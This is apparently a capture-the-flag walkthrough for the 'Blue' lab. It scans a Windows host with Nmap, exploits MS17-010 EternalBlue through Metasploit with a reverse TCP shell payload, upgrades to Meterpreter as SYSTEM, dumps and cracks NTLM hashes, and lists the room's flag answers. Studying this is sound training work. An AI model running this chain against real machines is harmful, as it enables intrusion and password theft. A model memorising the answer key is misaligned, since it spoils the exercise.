# Blue

## Recon

The first phase in any penetration testing or ethical hacking task is reconnaissance, where we gather information about the target system. In this case, we will use Nmap, a powerful network scanning tool, to identify open ports and potential vulnerabilities on the target machine.

### Q1. Scan the machine

#### Action

To start, we'll run a detailed Nmap scan using the following command:

```bash
sudo nmap -sS -T5 -A --script vuln -p 1-1000 10.10.30.13
```

**Explanation:**  
- `-sS`: Performs a TCP SYN scan, which is quicker and less likely to be detected.
- `-T5`: Sets the timing template to "Insane," making the scan faster, though it may be more detectable.
- `-A`: Enables OS detection, version detection, script scanning, and traceroute.
- `--script vuln`: Runs vulnerability scripts against the target.
- `-p 1-1000`: Scans the first 1000 ports.

This scan will identify open ports, services running on those ports, and any potential vulnerabilities.

**Sample Output:**

```
Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-15 21:18 BST
Warning: 10.10.30.13 giving up on port because retransmission cap hit (2).
Nmap scan report for ip-10-10-30-13.eu-west-1.compute.internal (10.10.30.13)
Host is up (0.00074s latency).
Not shown: 992 closed ports
PORT    STATE    SERVICE      VERSION
104/tcp filtered acr-nema
135/tcp open     msrpc        Microsoft Windows RPC
139/tcp open     netbios-ssn  Microsoft Windows netbios-ssn
266/tcp filtered sst
309/tcp filtered entrusttime
445/tcp open     microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
490/tcp filtered micom-pfs
884/tcp filtered unknown
MAC Address: 02:13:A4:66:88:31 (Unknown)
...
```

### Q2. How many ports are open with a port number under 1000?

#### Ans. 3

**Explanation:**  
From the Nmap scan results, three ports are identified as open under the first 1000 ports: 135, 139, and 445. These are important for understanding the services running on the target system and determining potential vulnerabilities.

### Q3. What is this machine vulnerable to? 

#### Ans. ms17-010

**Explanation:**  
The Nmap scan results also show that the target machine is vulnerable to `ms17-010`, a critical vulnerability in Microsoft's SMBv1 service that allows for remote code execution. This vulnerability was famously exploited by the WannaCry ransomware.

## Gain Access

Once we have identified a vulnerability, the next step is to exploit it to gain access to the target system. In this case, we will use Metasploit, a popular exploitation framework.

### Q1. Start Metasploit

#### Action

To begin, we start the Metasploit console with the following command:

```bash
msfconsole
```

**Explanation:**  
Metasploit provides a user-friendly interface for finding, configuring, and launching exploits against a target machine. 

### Q2. Find the exploitation code we will run against the machine

#### Action

Within Metasploit, search for the relevant exploit module by using:

```bash
msf5 > search ms17
msf5 > search eternal
```

**Explanation:**  
We search for modules related to `ms17-010`, specifically the "EternalBlue" exploit, which is widely known for its role in spreading ransomware.

**Sample Output:**

```
Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
```

#### Ans2. exploit/windows/smb/ms17_010_eternalblue

### Q3. Show options and set the one required value

#### Action

Select the exploit module and configure the required options:

```bash
msf5 > use 0
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
```

**Explanation:**  
The command `use 0` selects the first module from the search results. `show options` displays the configurable parameters for the selected exploit.

**Sample Output:**

```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
```

Next, we need to set the target's IP address as the `RHOSTS` value:

```bash
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.166.97
```

#### Ans3. RHOSTS

### Q4. Set payload and run the exploit

#### Action

Before running the exploit, we specify the payload:

```bash
set payload windows/x64/shell/reverse_tcp
```

Next, configure the remaining necessary parameters and execute the exploit:

```bash
set rhosts 10.10.30.13
set LPORT 4445
exploit
```

**Explanation:**  
- `payload windows/x64/shell/reverse_tcp`: This sets the payload that will establish a reverse TCP shell from the target to the attacker's machine.
- `LPORT 4445`: Specifies the local port to listen on for the reverse shell connection.

### Q5. Confirm the exploit's success

#### Action

After running the exploit, confirm that it has executed successfully. You may need to press enter for the shell to appear. If successful, you'll have a shell on the target system, and you can background it with `CTRL + Z`.

**Explanation:**  
Gaining a shell indicates that you've successfully exploited the vulnerability, giving you control over the target machine. If the exploit fails, you may need to reboot the target VM and try again.

## Escalate

Once you've gained initial access to the target system, the next step is to escalate privileges to gain more control. Often, the initial shell is limited in capabilities, so converting it to a Meterpreter shell is a common approach.

### Q1. Background the shell and convert it to a Meterpreter shell

If you haven't already done so, background the shell you gained previously by pressing `CTRL + Z`. Next, you'll need to research how to convert a regular shell into a Meterpreter shell within Metasploit. The module you'll use is a post-exploitation module specifically designed for this purpose.

#### Action

The module you'll use is:

```bash
post/multi/manage/shell_to_meterpreter
```

**Explanation:**  
This module allows you to upgrade a simple shell to a Meterpreter session, which provides more robust features for interacting with the target system.

### Q2. Select the module and configure the options

Once you have identified the module, you need to select it and configure the required options. 

```bash
msf5 > use post/multi/manage/shell_to_meterpreter
msf5 post(multi/manage/shell_to_meterpreter) > show options
```

**Sample Output:**

```
Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.
```

#### Ans: SESSION

**Explanation:**  
The `SESSION` option is the one that you must set. This specifies the session ID of the shell that you want to convert into a Meterpreter session.

### Q3. Set the required option and run the module

You may need to list all active sessions to find the correct session ID for your shell. Once identified, set the session ID and run the module.

```bash
msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf5 post(multi/manage/shell_to_meterpreter) > run
```

**Sample Output:**

```
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.8.106.222:4433
[*] Post module execution completed
[*] Sending stage (176195 bytes) to 10.10.166.97
[*] Meterpreter session 2 opened (10.8.106.222:4433 -> 10.10.166.97:49303) at 2024-08-15 17:41:50 -0400
[*] Stopping exploit/multi/handler
```

### Q4. Verify and escalate privileges

After successfully converting to a Meterpreter session, you should verify that you've escalated privileges to `NT AUTHORITY\SYSTEM`.

```bash
msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Explanation:**  
Running `getuid` confirms that you are now operating as `NT AUTHORITY\SYSTEM`, the highest privilege level on a Windows machine.

### Q5. Migrate to a stable process

Even though you have system-level privileges, the current process might not be stable. To ensure persistence, you should migrate to a more stable process running under `NT AUTHORITY\SYSTEM`.

```bash
meterpreter > ps
```

Identify a suitable process and migrate to it:

```bash
meterpreter > migrate <PROCESS_ID>
```

**Explanation:**  
Migrating to a stable system process, such as `spoolsv.exe`, ensures that your session remains active even if the initial process is terminated.

## Cracking

Once you have a stable Meterpreter session with elevated privileges, you can proceed to extract and crack password hashes.

### Q1. Dump password hashes

In your elevated Meterpreter shell, dump the password hashes using:

```bash
meterpreter > hashdump
```

**Sample Output:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

#### Ans: Jon

### Q2. Crack the password hash

Copy the hash for the user `Jon` and use a tool like John the Ripper to crack it:

```bash
john --format=NT --wordlist=<wordlist_path> hash.txt
```

**Sample Output:**

```bash
ffb43f0de35be4d9917ac0cc8ad57f8d : alqfna22
```

#### Ans: alqfna22

## Find Flags

### Q1. Flag 1

Navigate to the root directory and locate the first flag:

```bash
cd C:\
cat flag1.txt
```

#### Ans: `flag{access_the_machine}`

### Q2. Flag 2

Find the second flag in the location where Windows stores its passwords:

```bash
cd C:\Windows\system32\config
cat flag2.txt
```

#### Ans: `flag{sam_database_elevated_access}`

### Q3. Flag 3

The final flag is located in a directory where administrators typically save important files:

```bash
cd C:\Users\Jon\Documents
cat flag3.txt
```

#### Ans: `flag{admin_documents_can_be_valuable}`
